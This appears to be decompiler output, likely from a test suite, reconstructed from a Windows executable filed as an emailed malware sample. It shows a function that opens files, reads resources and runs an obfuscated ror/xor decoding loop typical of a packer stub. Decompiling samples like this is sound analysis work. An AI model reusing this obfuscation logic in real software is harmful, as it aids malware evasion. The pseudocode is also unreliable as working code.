// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1414/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

real64 fn13102A6C(word32 edx, Eq_332 * ebp, Eq_340 ds, word32 dwArg00, real64 rArg0)
{
fn13102A6C_entry:
	goto l13102A6C
l1310102C:
	fp->tFFFFFFFC = ds;
	Mem216[eax_171 + 0x00000000:word32] = edi_149
l131010A6:
	branch ebx_130 >u 0x00000000 l1310102C
l131010A8:
	__outb(0x94, (byte) &fp->tFFFFFFFC)
	word32 edi_182 = Mem162[eax_171 + 0x00000000:word32]
	(edi_182 + 0x5F94E7A9)[ebx_159 * 2] = rArg0
	Mem189[esi_141 + 0xCD295F96:word32] = Mem187[esi_141 + 0xCD295F96:word32] - (fp + 0x00000004)
	Mem194[edi_182 + 0x00000000:word32] = Mem189[esi_141 + 0x00000000:word32]
	ebp->dw0000 = DPB(edx, 0xAD, 0, 8);
	Mem204[esi_141 + 0x05623F12:byte] = Mem200[esi_141 + 0x05623F12:byte] ^ 0x81
	__inb(0x15)
l13102A6C:
	GetTickCount()
	Eq_6 eax_36 = CreateFileA(0x13111000, 0xE0000000, 0x00000001, 0x00000000, 0x00000003, 0x00000024, 0x00000000)
	Eq_24 * esp_125 = &fp->tFFFFFFCC
l13102AA6:
	word32 eax_41 = CoRegisterPSClsid(esp_125->ptr0000, esp_125->ptr0004)
	GetTickCount()
	Eq_24 * esp_42 = esp_125 + 2
	Mem47[esp_42 - 0x00000004:word32] = eax_36
	CloseHandle(esp_42->ptr0004)
	Mem52[esp_42 - 0x00000004:word32] = eax_36
	CloseHandle(esp_42->ptr0004)
	Mem56[esp_42 - 0x00000004:word32] = 0x00000000
	Mem58[esp_42 - 0x00000008:word32] = 0x000000A2
	Mem60[esp_42 - 0x0000000C:word32] = 0x00000003
	Mem62[esp_42 - 0x00000010:word32] = 0x00000000
	Mem64[esp_42 - 0x00000014:word32] = 0x00000003
	Mem66[esp_42 - 0x00000018:word32] = 0x20000000
	Mem68[esp_42 - 0x0000001C:word32] = 0x1311101F
	Eq_89 * esi_127 = &globals->a13101080
	Eq_6 eax_69 = CreateFileA(esp_42->t0008, esp_42->t0008, esp_42->t0008, esp_42->t0008, esp_42->t0008, esp_42->t0008, esp_42->ptr0004)
	esp_125 = esp_42;
	branch eax_69 != 0xFFFFFFFF l13102AA6
l13102B05:
	up32 ebx_130 = 0x0000056E
l13102B08:
	esi_127->dw0000 = esi_127->dw0000 + eax_41;
	GetVersion()
	esi_127->dw0000 = __ror(esi_127->dw0000, 0x48);
	GetFocus()
	esi_127->dw0000 = esi_127->dw0000 + eax_41;
	Eq_147 * esp_88 = esp_125 - 0x00000004
	Mem89[esp_88 + 0x00000000:word32] = eax_36
	GetFileType(esp_88->t0000)
	esi_127->dw0000 = -esi_127->dw0000;
	Mem95[esp_88 + 0x00000000:word32] = eax_69
	Mem97[esp_88 - 0x00000004:word32] = 0x00000000
	SizeofResource(esp_88->u0004, esp_88->t0000)
	GetVersion()
	esi_127->dw0000 = esi_127->dw0000 + eax_41;
	esi_127->dw0000 = esi_127->dw0000 + eax_41;
	GetProcessHeap()
	esi_127->dw0000 = -esi_127->dw0000;
	esi_127->dw0000 = esi_127->dw0000 ^ eax_41;
	GetVersion()
	esi_127->dw0000 = esi_127->dw0000 ^ 0x4F14E84B;
	GetTickCount()
	esi_127->dw0000 = __ror(esi_127->dw0000, 0xE5);
	Mem121[esp_88 + 0x00000000:word32] = eax_69
	Mem123[esp_88 - 0x00000004:word32] = 0x00000000
	LoadResource(esp_88->u0004, esp_88->t0000)
	esp_125 = esp_88 + 0x00000004
	esi_127 = esi_127 + 1;
	ebx_130 = ebx_130 - 0x00000001;
	branch ebx_130 != 0x00000000 l13102B08
l13102B87:
	&*esp_88->t0000.u0 = 0x00000000;
	esp_88->u0004.u0 = eax_69;
	GetFileSize(esp_88->u0004, esp_88->t0000)
	Eq_6 esi_141 = esp_88->u0004
	esp_88->u0004.u0 = eax_36;
	&*esp_88->t0000.u0 = 0x00000000;
	SizeofResource(esp_88->t0000, esp_88->u0004)
	Eq_6 edi_149 = esp_88->t0008
	GetVersion()
	Mem154[esp_88 + 0x00000008:word32] = eax_36
	Mem156[esp_88 + 0x00000004:word32] = 0x00000000
	SizeofResource(esp_88->u0004, esp_88->t0008)
	Eq_6 ebx_159 = esp_88->t000C
	Mem162[esp_88 + 0x0000000C:word32] = eax_69
	CloseHandle(esp_88->t000C)
	Eq_6 * eax_171 = GetFileSize(ebp->tFFFFFFFC, 0x00000000)
	goto l131010A6
fn13102A6C_exit:
}

